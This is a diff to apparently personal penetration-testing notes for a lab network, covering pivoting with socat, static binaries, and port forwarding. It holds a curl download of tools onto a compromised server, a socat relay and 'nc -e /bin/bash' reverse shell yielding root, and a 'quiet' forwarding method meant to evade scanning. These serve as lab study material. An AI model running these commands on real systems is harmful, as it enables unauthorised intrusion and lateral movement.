@@ -468,6 +468,13 @@ Port scanning - takes a long time however
 for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 ```
 
+### Example static binaries
+
+These binaries can be uploaded to the compromised machine to run. See Pivoting - Socat for more instructions
+
+[socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
+[other binaries](https://github.com/andrew-d/static-binaries)
+
 </details>
 
 ## 6. Proxychains and FoxyProxy
@@ -606,7 +613,7 @@ To kill any connections use `ps aux | grep ssh` then `sudo kill PID`
 
 </details>
 
-## 7 Pivoting - plink.exe
+## 7. Pivoting - plink.exe
 
 <details>
   <summary>---</summary>
@@ -635,7 +642,7 @@ plink is preinstalled on Kali at `/usr/share/windows-resources/binaries/plink.ex
 
 </details>
 
-## 8 Pivoting - Socat
+## 8. Pivoting - Socat
 
 <details>
   <summary>---</summary>
@@ -674,7 +681,9 @@ Attacking machine
 kali@kali:~/thm/wreath$ sudo python3 -m http.server 80
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.200.81.200 - - [05/Apr/2021 00:10:09] "GET /socat HTTP/1.1" 200 -
+10.200.81.200 - - [05/Apr/2021 02:40:22] "GET /socat-Neozer0 HTTP/1.1" 200 -
+10.200.81.200 - - [05/Apr/2021 02:41:13] "GET /nc-Neozer0 HTTP/1.1" 200 -
+
 ```
 
 Compromised webserver
@@ -686,24 +695,26 @@ root@prod-serv tmp]# curl 10.50.82.56/socat -o /tmp/socat-Neozer0 && chmod +x /t
 
 [root@prod-serv tmp]# ls -la socat-N*
 -rwxr-xr-x. 1 root root 378384 Apr  5 05:08 socat-Neozer0
-
 ```
 
 ### Reverse shell relay
 
 Start a listener in attacking machine
 ```
-sudo nc -lvnp 1990
+kali@kali:~/thm/wreath$ sudo nc -lvnp 443
+listening on [any] 443 ...
+
 ```
 
 run socat on compromised webserver
 ```
-[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:8000 tcp:10.50.82.56:1990 &
+[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:8000 tcp:10.50.82.56:443 &
 [1] 2136
-
-
-
 ```
+
+`tcp-l:8000` : create first half of the connection - an IPv4 listener on tcp port 8000 of target machine
+`tcp:ATTACKING_IP_443` : connects back to our local IP on port 443
+`&` : backgrounds the listener while we can still use the shell for other commands
 
 Create reverse shell on newly opened port 8000
 
@@ -712,7 +723,111 @@ chmod +x ./nc-Neozer0
 
 ./nc-Neozer0 127.0.0.1 8000 -e /bin/bash
 
+```
+
+Back on attacking machine we have a reverse shell
 
 ```
+sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 41630
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:9b:ca:22:d5:ab brd ff:ff:ff:ff:ff:ff
+    inet 10.200.81.200/24 brd 10.200.81.255 scope global dynamic noprefixroute eth0
+       valid_lft 2072sec preferred_lft 2072sec
+    inet6 fe80::9b:caff:fe22:d5ab/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+### Port forwarding -- easy
+
+The quick and easy way is to open up a listening port on compromised server and redirect whatever traffic it receives to target server
+
+For example, compromise server 172.16.0.5 and target port 3306 of 172.16.0.10 then we could run `./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`. This opens port 33060 on compromised server and redirects input from attacking machine straight to target server 172.16.0.10 port 3306 (MySQL database)
+
+`fork` : put every connection into new process
+`reuseaddr` : port stays open after connection is made
+`&` : backgrounds the shell, keep using same terminal session
+
+Above options combined allow us to use the same port forward for more than one connection.
+
+We can now connect to port 33060 on the relay 172.16.0.5 and connection directly relayed to our target 172.16.0.10:3306
+
+TODO: [port forwarding easy diagram]
+
+### Port forwarding -- quiet
+
+If we want to avoid opening a port and potentially alert any host/network scanning, we can use a quieter method of port forwarding with socat. This is slightly more complex.
+
+1. Open up two port listeners on the attacking machine
+
+Attacking machine
+```
+socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+```
+
+This opens up two ports 8000 and 8001, creating port relay
+
+2. Start a relay on compromised server
+
+Compromised relay server
+```
+./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+```
+
+This makes connection between our listening 8001 on attacking machine and open port on target server
+
+For example, 
+
+```
+./socat tcp:10.50.73.2:8001 tcp:172.16.0/10:80,fork &
+```
+
+This creates a link between port 8000 on attacking machine and port 80 on intended target 172.16.0.10. If we go to localhost:8000 on our attacking machine's web browser, it would load the webpage served by target 172.16.0.10:80.
+
+Summary visiting webpage on attacking server:
+- Request goes to 127.0.0.1:8000
+- Socat listenner, anything goes into port 8000, comeso ut of port 8001
+- Port 8001 is connected directly to socat porcess on the compromised server. Anything coming out of port 8001 gets sent to compromised server and relayed to port 80 on target server
+
+Summary target sends response:
+- Response sent to socat process on compromised server. What goes in process comes out to port 8001 on our attacking machine
+- Anything goes in port 8001 on attacking machine comes out of port 8000 which is where web browser expects to receive its response
+
+TODO: [port forwarding quiet diagram]
+
+### Killing backgrounded socat port forwards
+
+`jobs` : run command to see socat processes
+`kill %NUMBER` : kill socat process
+
+```
+kali@kali:~$ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+[1] 6453
+kali@kali:~$ jobs
+[1]+  Running                 socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+kali@kali:~$ kill %1
+kali@kali:~$ jobs
+[1]+  Exit 143                socat tcp-l:8001 tcp-l:8000,fork,reuseaddr
+```
+
+</details>
+
+## 9. Pivoting - Chisel
+
+<details>
+  <summary>---</summary>
+
 
 </details>
